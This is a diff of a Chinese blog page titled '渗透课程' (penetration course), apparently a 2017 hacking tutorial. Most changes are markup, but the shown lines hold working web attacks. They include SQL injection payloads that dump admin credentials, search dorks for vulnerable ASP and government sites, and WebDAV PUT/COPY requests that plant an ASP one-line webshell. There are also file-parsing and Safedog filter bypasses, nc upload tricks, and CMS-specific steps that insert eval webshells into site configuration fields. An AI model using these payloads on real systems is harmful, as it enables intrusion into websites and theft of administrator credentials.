@@ -257,35 +257,35 @@
   
   <div class="article-inner">
     
-  
-    <header class="article-header">
-      
+    
+      <header class="article-header">
+        
   
     <h1 class="article-title" itemprop="name">
       渗透课程
     </h1>
   
 
+        
+      </header>
       
-    </header>
-    
-    <div class="article-info article-info-post">
-      
-      
+      <div class="article-info article-info-post">
+        
+        
     <div class="article-category tagcloud">
     <a class="article-category-link" href="/categories/Study/">Study</a>
     </div>
 
 
-      
+        
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Mark/">Mark</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Summary/">Summary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透课程/">渗透课程</a></li></ul>
     </div>
 
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+      </div>
+      
     
-  
     <div class="article-entry" itemprop="articleBody">
       
           
@@ -597,16 +597,16 @@
 <p>‘又 这里呢1=1永远为真,后面 and password = ‘456’被注释掉了。数据库不需要考虑,这里我们就跳过了验证。</p>
 <p>这就是几年前的万能密码,这里只是说说逻辑。我们再来看看下面另一个例子。</p>
 <h2 id="整型参数的判断"><a href="#整型参数的判断" class="headerlink" title="整型参数的判断"></a>整型参数的判断</h2><p>SQL注入一般存在于形如：</p>
-<p><a href="http://www.yuntest.org/archives/tag/http/" target="_blank" rel="noopener">HTTP</a>://www.xxx.xxx/text.asp?id=XX</p>
-<p>这种带有参数的asp或者动态网页中，注入又分为整形注入和字符串注入。总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入。下以HTTP://www.xxx.xxx/test.asp?p=xx为例进行分析，xx此处设为整型。</p>
+<p><a href="http://www.yuntest.org/archives/tag/http/" target="_blank" rel="noopener">HTTP</a>://<a href="http://www.xxx.xxx/text.asp?id=XX" target="_blank" rel="noopener">www.xxx.xxx/text.asp?id=XX</a></p>
+<p>这种带有参数的asp或者动态网页中，注入又分为整形注入和字符串注入。总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入。下以HTTP://<a href="http://www.xxx.xxx/test.asp?p=xx为例进行分析，xx此处设为整型。" target="_blank" rel="noopener">www.xxx.xxx/test.asp?p=xx为例进行分析，xx此处设为整型。</a></p>
 <p>当输入的参数xx为整型时，通常test.asp中SQL语句原貌大致如下：</p>
 <p>select * from 表名 where 字段=xx</p>
 <p>所以可以用以下步骤<a href="http://www.yuntest.org/archives/tag/ce-shi/" target="_blank" rel="noopener">测试</a>SQL注入是否存在。</p>
-<p>①HTTP://www.xxx.xxx/text.asp?p=xx’(附加一个单引号)此时abc.ASP中的SQL语句变成了</p>
+<p>①HTTP://<a href="http://www.xxx.xxx/text.asp?p=xx’(附加一个单引号)此时abc.ASP中的SQL语句变成了" target="_blank" rel="noopener">www.xxx.xxx/text.asp?p=xx’(附加一个单引号)此时abc.ASP中的SQL语句变成了</a></p>
 <p>select * from 表名 where 字段=YY’</p>
 <p>数据库无法处理,返回异常；</p>
-<p>②HTTP://www.xxx.xxx/test.asp?p=xx and 1=1。1=1为真 test.asp运行正常，而且与没加语句之前的test.asp?p=xx运行结果一样正常显示；</p>
-<p>③HTTP://www.xxx.xxx/test.asp?p=YY and 1=2,语句为假,因为1≠2  test.asp运行异常；如果以上三步全面满足，test.asp中一定存在SQL注入<a href="http://www.yuntest.org/archives/tag/lou-dong/" target="_blank" rel="noopener">漏洞</a>。</p>
+<p>②HTTP://<a href="http://www.xxx.xxx/test.asp?p=xx" target="_blank" rel="noopener">www.xxx.xxx/test.asp?p=xx</a> and 1=1。1=1为真 test.asp运行正常，而且与没加语句之前的test.asp?p=xx运行结果一样正常显示；</p>
+<p>③HTTP://<a href="http://www.xxx.xxx/test.asp?p=YY" target="_blank" rel="noopener">www.xxx.xxx/test.asp?p=YY</a> and 1=2,语句为假,因为1≠2  test.asp运行异常；如果以上三步全面满足，test.asp中一定存在SQL注入<a href="http://www.yuntest.org/archives/tag/lou-dong/" target="_blank" rel="noopener">漏洞</a>。</p>
 <p>小技巧：有时管理员会在后台设置过滤掉单引号等字符，以防止SQL注入。此时可以用以下几种试一试。</p>
 <p>大小定混合法：VBS并不区分大小写，而网站程序可能区分。然后程序员在过滤时通常要么全部过滤大写字符串，要么全部过滤小写字符串，而大小写混合往往会被忽视。如用SelecT代替select,SELECT等；</p>
 <p>UNICODE法：在IIS中，以UNICODE字符集实现国际化，我们完全可以IE中输入的字符串化成UNICODE字符串进行输入。如+ =%2B，空格=%20 等；URLEncode信息可以参加百度；</p>
@@ -646,7 +646,7 @@
 </ul>
 <p>请求：</p>
 <p>OPTIONS / <a href="http://www.yuntest.org/archives/tag/http/" target="_blank" rel="noopener">HTTP</a>/1.1</p>
-<p>Host:www.example.com</p>
+<p>Host:<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a></p>
 <p>响应：</p>
 <p>Public:OPTIONS,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE,MKCOL,PROPFIND,PROPPATCH,LOCK,UNLOCK,SEARCH</p>
 <ul>
@@ -654,18 +654,18 @@
 </ul>
 <p>请求：</p>
 <p>PUT /a.txt HTTP/1.1</p>
-<p>Host:www.example.com</p>
+<p>Host:<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a></p>
 <p>Content-Length:30</p>
 <p>&lt;%eval request(“chopper”)%&gt;</p>
 <p>第三步，通过Move或Copy方法改名</p>
 <p>请求：</p>
 <p>COPY /a.txt HTTP/1.1</p>
-<p>Host:www.example.com</p>
+<p>Host:<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a></p>
 <p>Destination:<a href="http://www.example.com/cmd.asp" target="_blank" rel="noopener">http://www.example.com/cmd.asp</a></p>
 <p>第四步，使用DELETE方法，<a href="http://www.yuntest.org/archives/tag/gong-ji/" target="_blank" rel="noopener">攻击</a>者还可以删除服务器上的任意文件</p>
 <p>请求：</p>
 <p>DELETE /a.txt HTTP/1.1</p>
-<p>Host:www.example.com</p>
+<p>Host:<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a></p>
 <h2 id="二、Apache解析漏洞"><a href="#二、Apache解析漏洞" class="headerlink" title="二、Apache解析漏洞"></a>二、Apache解析漏洞</h2><p>在Apache 1.x和Apache 2.x中1.php.rar会被当作php文件执行。</p>
 <p>Apache在解析文件时有一个原则：当碰到不认识的扩展名时，将会从后面向前解析，直到碰到认识的扩展名为止。</p>
 <p>例 上传文件：</p>
@@ -682,7 +682,7 @@
 <p>这不是Nginx特有的漏洞，在IIS7.0、IIS7.5、Lighttpd等Web容器中也经常会出现这样的解析漏洞。</p>
 <p>这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于C:wampbinphpphp5.3.10php.ini，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。</p>
 <h1 id="第七篇-上传漏洞之绕过上传漏洞"><a href="#第七篇-上传漏洞之绕过上传漏洞" class="headerlink" title="第七篇-上传漏洞之绕过上传漏洞"></a>第七篇-上传漏洞之绕过上传漏洞</h1><p>前一篇我们已经讲过了上传漏洞的解析漏洞,在某些时候,知道网站存在哪个解析漏洞,那么我们就可以更好的利用上传漏洞</p>
-<p>这个知识点在我们前面就有粗略说过了(<a href="http://www.yuntest.org/index.php/archives/765.html" target="_blank" rel="noopener">http://www.yuntest.org/index.php/archives/765.html</a>), http拦截也是上传漏洞的其中之一, 下面我们来对绕过上传漏洞进行更深的了解。</p>
+<p>这个知识点在我们前面就有粗略说过了(<a href="http://www.yuntest.org/index.php/archives/765.html)" target="_blank" rel="noopener">http://www.yuntest.org/index.php/archives/765.html)</a>, http拦截也是上传漏洞的其中之一, 下面我们来对绕过上传漏洞进行更深的了解。</p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>管理员防止文件上传漏洞时可以分为两种,一种是客户端检测,一种是服务端检测：</p>
 <p>客户端检测：使用JavaScript检测，在文件上传之前,就对文件进行验证</p>
 <p>服务器端检测：服务端脚本一般会检测文件的<a href="http://www.yuntest.org/go/?url=https://wapbaike.baidu.com/item/MIME/2900607?adapt=1&amp;fr=aladdin" target="_blank" rel="noopener">MIME类型</a>（这里大家先点过去了解一下mime类型）检测文件扩展名是否合法，甚至有些程序检测文件中是否嵌入恶意代码。</p>
@@ -940,7 +940,7 @@
 <p>inurl:detail.php?</p>
 <p>CompHonorBig.asp?id= 很不错的的一个搜索注入点</p>
 <p>inurl:show.asp? 非常强大</p>
-<p>site:www.yuming.com</p>
+<p>site:<a href="http://www.yuming.com" target="_blank" rel="noopener">www.yuming.com</a></p>
 <p>inurl:articleshow.asp?articleid=数字</p>
 <p>inurl:szwyadmin/login.asp</p>
 <p>inurl:asp?id=1 intitle:政府</p>
@@ -969,7 +969,7 @@
 <p>当系统验证cookie的时候，就要用到火狐浏览器了，<a href="http://www.yuntest.org/archives/tag/deng-lu/" target="_blank" rel="noopener">登录</a>网站进后台，让火狐浏览器保存管理员的cookie值，再把修改后的“双文件上传工具”拖进去上传。</p>
 <p>1.在后台找上传点，右键查看源文件，找到上传地址，一般在post或action的附近，搜索即可找到，一般为：src=”../xxx.htm” 之后补全路径访问。</p>
 <p>2.这个还不是真正的上传页面，真正的上传页面后缀是asp的，继续查看源代码，找到action=”xxx.asp”，补全路径访问即可！</p>
-<p>4.其实也可以抓包从而获得上传路径，抓包之后，在Referer:这栏，还有常见的是：htto://www.xxxx.com/upfile_other.asp</p>
+<p>4.其实也可以抓包从而获得上传路径，抓包之后，在Referer:这栏，还有常见的是：htto://<a href="http://www.xxxx.com/upfile_other.asp" target="_blank" rel="noopener">www.xxxx.com/upfile_other.asp</a></p>
 <p>3.打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。</p>
 <p>【 数据库备份抓包改包NC提交拿shell 】</p>
 <p>当备份路径不能修改,后缀又是mdb不变的时候，我们可先对备份的过程进行抓包，再本地构造用NC提交即可突破备份，数据库恢复也可使用此方法！</p>
@@ -1009,7 +1009,7 @@
 <p>C:Documents and Settingslei桌面1.jpg (将1.jpg 改为 1.asp空格，16进制下将20改为00)</p>
 <p>3.在Content-Length处加上../uploadfile/后增加的字节数。</p>
 <p>4.用C32将空格的20改为00，保存为1.txt。</p>
-<p>5.把1.txt跟nc.exe放在同一目录下，cmd命令：nc -vv www.XXXX.com 80&lt;1.txt</p>
+<p>5.把1.txt跟nc.exe放在同一目录下，cmd命令：nc -vv <a href="http://www.XXXX.com" target="_blank" rel="noopener">www.XXXX.com</a> 80&lt;1.txt</p>
 <p>( 如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php 再不行就用IIS 6.0解析漏洞，将文件名改为1.asa;1.jpg )</p>
 <h3 id="【-抓包nc上传获取管理权限-】"><a href="#【-抓包nc上传获取管理权限-】" class="headerlink" title="【 抓包nc上传获取管理权限 】"></a>【 抓包nc上传获取管理权限 】</h3><p>这个方法相当于cookie欺骗，首先到前台去注册一个会员，注册成功后在登录的那一刻，用抓包工具进行抓包，把抓到的数据复制到1.txt里面。</p>
 <p>接下来打开，把双引号里棉的数据“X-Forwarded-For: 127.0.0.2’,group_id = 1 where loginname = ‘会员的帐号’#” 放在Content-Length：的下面。</p>
@@ -1028,7 +1028,7 @@
 <p>文件名为<a href="http://www.baicai.com/1.asp;1.jpg" target="_blank" rel="noopener">http://www.baicai.com/1.asp;1.jpg</a></p>
 <p>这样的会被IIS安全狗果断屏蔽</p>
 <p>改成如下名称,IIS6一样会解析:</p>
-<p>www.baicai.com/;1.asp;1.jpg</p>
+<p><a href="http://www.baicai.com/;1.asp;1.jpg" target="_blank" rel="noopener">www.baicai.com/;1.asp;1.jpg</a></p>
 <p>3、安全狗的注入绕过</p>
 <p>常用的如baicai.asp?id=1 and 1=1 是会被安全狗屏蔽的。</p>
 <p>但这样就可以突破了：</p>
@@ -1056,7 +1056,7 @@
 <p>大家都清楚，写权限就是允许PUT，与网站自身运行的权限无丝毫联系，如果开启了，就是没有一点安全意识，就给我们提供了大大的方便。</p>
 <p>首先用御剑工具扫下C段，比如：12.12.12.1 – 12.12.12.255 打开IIS PUT Scaner，把12.12.12.1放在Start IP 这里，12.12.12.255放在End IP 这里，</p>
 <p>接着在Port这里，换成80，点击Scan开始嗅探，当PUT这里显示是Yes就说明存在漏洞，可以右键选择PUT file，输入文件名1.txt，下面填内容，保存就可以写入了。</p>
-<p>或是利用“桂林老兵IIS写权限利用程序”也可以，这款工具比较强大，把域名填写进去，例如：www.xxx.com，然后在请求文件那里输入你的文件名，</p>
+<p>或是利用“桂林老兵IIS写权限利用程序”也可以，这款工具比较强大，把域名填写进去，例如：<a href="http://www.xxx.com，然后在请求文件那里输入你的文件名，" target="_blank" rel="noopener">www.xxx.com，然后在请求文件那里输入你的文件名，</a></p>
 <p>在数据包格式那里选择PUT，有的会直接弹出浏览文件框，没有就自己选择，在下面，然后点击提交数据库即可，一般是先PUT一个txt文件，再MOVE成asp木马。</p>
 <p>直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。</p>
 <p>==========================================================================================================================</p>
@@ -1134,7 +1134,7 @@
 <p>后台-订单管理-订单打印-选择源代码编辑-保存-返回订单列表，随意选择一个订单打印，返回OK，生成一句话成功-在根目录生成了一个null.php，一句话密码：usb</p>
 <p>==========================================================================================================================</p>
 <h3 id="【-教育站sql注入通杀0day-】"><a href="#【-教育站sql注入通杀0day-】" class="headerlink" title="【 教育站sql注入通杀0day 】"></a>【 教育站sql注入通杀0day 】</h3><p>关键词：inurl:info_Print.asp?ArticleID=</p>
-<p>默认后台：www.xx.com/ad_login.asp</p>
+<p>默认后台：<a href="http://www.xx.com/ad_login.asp" target="_blank" rel="noopener">www.xx.com/ad_login.asp</a></p>
 <p>比如：<a href="http://www.xx.com/info_Print.asp?ArticleID=539" target="_blank" rel="noopener">http://www.xx.com/info_Print.asp?ArticleID=539</a></p>
 <p>加上：union select 1,2,username,password,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from admin</p>
 <p>这样就直接得到了管理员账户和经过Md5加密的密码了。</p>
@@ -1196,7 +1196,7 @@
 <p>也可以用下面的exp拿shell：</p>
 <p>用火狐浏览器登录后台，因为火狐浏览器有保留cookies的功能， 找到“phpweb之exp”这个html，拉进火狐浏览器器里上传1.php;.jpg的一句话木马，查看源码菜刀连接！</p>
 <p>—————————————————————————————————————————————————————-</p>
-<h3 id="【动科-dkcms-漏洞】"><a href="#【动科-dkcms-漏洞】" class="headerlink" title="【动科(dkcms)漏洞】:"></a>【动科(dkcms)漏洞】:</h3><p>官方网站：www.dkcms.com主要是差不多3个版本为主吧，</p>
+<h3 id="【动科-dkcms-漏洞】"><a href="#【动科-dkcms-漏洞】" class="headerlink" title="【动科(dkcms)漏洞】:"></a>【动科(dkcms)漏洞】:</h3><p>官方网站：<a href="http://www.dkcms.com主要是差不多3个版本为主吧，" target="_blank" rel="noopener">www.dkcms.com主要是差不多3个版本为主吧，</a></p>
 <p>V2.0 data/dkcm_ssdfhwejkfs.mdb</p>
 <p>V3.1 _data/___dkcms_30_free.mdb</p>
 <p>V4.2 _data/I^(()UU()H.mdb</p>
@@ -1227,7 +1227,7 @@
 <p>NewsType.asp?SmallClass=’%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20”=’</p>
 <p>（ 一句话木马的妙用 ）</p>
 <p>插入一句话木马后，连接网站的配置文件：inc/config.asp 密码都是g</p>
-<p>1.网站配置-允许的上传文件类型-插入闭合的一句话木马：”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 不行就增加一个cer格式，之后上传cer格式的木马即可 2.网站配置-网站地址-插入闭合的一句话木马：<a href="http://”%&gt;" target="_blank" rel="noopener">http://”%&gt;</a>&lt;%execute(request(“g”))%&gt;&lt;%’ 3.网站配置-网站名称-插入闭合的一句话木马：沧州临港彩越化工有限公司”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 4.网站配置-版权信息-插入闭合的一句话木马：”%&gt;&lt;%eval(request(chr(103)))%&gt;&lt;%’</p>
+<p>1.网站配置-允许的上传文件类型-插入闭合的一句话木马：”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 不行就增加一个cer格式，之后上传cer格式的木马即可 2.网站配置-网站地址-插入闭合的一句话木马：http://”%&gt;&lt;%execute(request(“g”))%&gt;&lt;%’ 3.网站配置-网站名称-插入闭合的一句话木马：沧州临港彩越化工有限公司”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 4.网站配置-版权信息-插入闭合的一句话木马：”%&gt;&lt;%eval(request(chr(103)))%&gt;&lt;%’</p>
 <p>（ 利用upfile_other.asp漏洞拿shell ）</p>
 <p>直接访问会员中心：userreg.asp</p>
 <p>注册一个用户并在未退出登录的状态下，使用双文件上传工具足以爆它菊花，以下代码保存为1.html，并里面的修改目标站，第一个上传jpg，第二个上传cer</p>
@@ -1271,6 +1271,8 @@
     <div class="copyright">
         <p><span>Title:</span><a href="/2017/12/26/渗透课程/">渗透课程</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage">KarmA</a></p>
+        <p><span class="post-count">Words:</span>24,072</p>
+        <p><span class="post-count">Time:</span>93 mins</p>
         <p><span>Created:</span>2017-12-26, 16:42:05</p>
         <p><span>Updated:</span>2017-12-29, 23:52:36</p>
         <p>
@@ -1302,6 +1304,7 @@
         
     </nav>
 
+  
   
 </article>
 
@@ -1357,10 +1360,11 @@
 
 
 
-    
-        <!-- 来必力City版安装代码 -->
-<div id="lv-container" data-id="city" data-uid="MTAyMC8zNzM1NC8xMzg4OA==">
-	<script type="text/javascript">
+        
+      <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zNDM3Ny8xMDkxNA==">
+    <script type="text/javascript">
    (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
 
@@ -1371,11 +1375,12 @@
        j.async = true;
 
        e.parentNode.insertBefore(j, e);
-   })(document, 'script');
-	</script>
-<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
-</div>
-<!-- City版安装代码已完成 -->
+       })(document, 'script');
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</section>
     
 
 
@@ -1414,9 +1419,8 @@
                 2017-2018 KarmA
             </div>
             <div id="footer_right_div" class="footer-right" style="text-align:center;overflow:hidden;">
-                <div id="id_keep_div" style="display:inline;"><span class="my-face" style="vertical-align:middle;">
-
-                     Follow Your Heart.
+                <div id="web_count_div" class="post-count-bottom" style="display:inline;">
+                    Follow Your Heart.
                     <i class="fa fa-heart animated infinite pulse" style="color:red;margin-left:2px;"></i><!-- 红心-->
                 </div>
             </div>
@@ -1438,17 +1442,14 @@
                         </span>
                     </span>
                     <span>| </span>
-                    <span title="All Words">
+                    <span title="本站总字数统计">
                          <span><i class="fa fa-map" aria-hidden="true"></i></span>
-                         <span class="post-count"><b>75.9k</b></span>
+                        <span class="post-count"><b>76.3k</b></span>
                     </span>
                 
-
             </div>
         
-        </br>
         
-
     </div>
 </footer>
     </div>
